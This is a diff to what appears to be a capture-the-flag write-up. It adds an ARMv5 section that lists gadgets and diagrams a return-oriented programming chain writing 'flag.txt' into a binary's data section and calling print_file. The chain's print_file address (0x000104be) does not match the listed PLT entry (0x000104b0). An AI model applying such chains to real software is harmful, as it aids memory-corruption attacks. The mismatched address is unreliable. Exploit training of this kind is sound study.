@@ -82,3 +82,43 @@ The payload is then very similar to the x86_64 one.
 The left block is repeated 2 times, writing `flag` then `.txt` at DATA and DATA+4 respectively.
 Then we call print_file using the written string address.
 ## ARMv5:
+```asm
+[22] .data             PROGBITS        00021024 001024 000008 00  WA  0   0  4
+
+000104b0 <print_file@plt>:
+
+000105ec <usefulGadgets>:
+   105ec:	e5843000 	str	r3, [r4]
+   105f0:	e8bd8018 	pop	{r3, r4, pc}
+   105f4:	e8bd8001 	pop	{r0, pc}
+```
+Using the 3 gadgets, we can do the same maneuver of writing `flag.txt` into the data section.
+Since the store gadget falls into the triple pop, we can use those from our first write to
+setup registers for the second one.
+```
+┌─────────────┐
+│ 0x000105f0  │ <- pop {r3, r4, pc}
+├─────────────┤
+│ "flag"      │ <- String literal
+├─────────────┤
+│ 0x00021024  │ <- DATA
+├─────────────┤
+│ 0x000105ec  │ <- str r3, [r4]; pop {r3, r4, pc}
+├─────────────┤
+│ ".txt"      │ <- String literal
+├─────────────┤
+│ 0x00021028  │ <- DATA + 4
+├─────────────┤
+│ 0x000105ec  │ <- str r3, [r4]; pop {r3, r4, pc}
+├─────────────┤
+│ 00 00 00 00 │ <- dummy values for r3 and r4
+│ 00 00 00 00 │
+├─────────────┤
+│ 0x000105f4  │ <- pop {r0, pc}
+├─────────────┤
+│ 0x00021024  │ <- DATA
+├─────────────┤
+│ 0x000104be  │ <- print_file
+├─────────────┤
+│ ...         │
+```
